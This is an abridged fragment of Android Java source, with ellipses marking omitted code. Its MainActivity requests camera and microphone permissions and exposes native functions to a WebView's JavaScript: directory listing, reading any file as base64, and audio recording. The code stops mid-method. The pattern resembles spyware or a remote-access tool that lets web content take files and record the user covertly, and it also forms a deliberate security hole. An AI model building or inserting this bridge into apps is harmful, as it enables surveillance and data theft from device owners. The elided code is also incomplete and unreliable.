...
public class MainActivity extends Activity {
    ...
    protected void onCreate(Bundle s) {
        super.onCreate(s);
        if (Build.VERSION.SDK_INT >= 23) { requestPermissions(new String[]{Manifest.permission.CAMERA, Manifest.permission.RECORD_AUDIO}, 1); }
        ...
        w.addJavascriptInterface(new Object() {
            @JavascriptInterface public String list(String p) {
                try { File f = new File(p); File[] fls = f.listFiles(); StringBuilder sb = new StringBuilder();
            ...
            @JavascriptInterface public String getFileBase64(String p) {
                try { byte[] b = java.nio.file.Files.readAllBytes(new File(p).toPath()); return Base64.encodeToString(b, Base64.NO_WRAP); } catch (Exception e) { return "Error"; }
            }
            ...
            @JavascriptInterface public void recordAudio(int ms) {
                try {
                    ...
                    r.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4); r.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
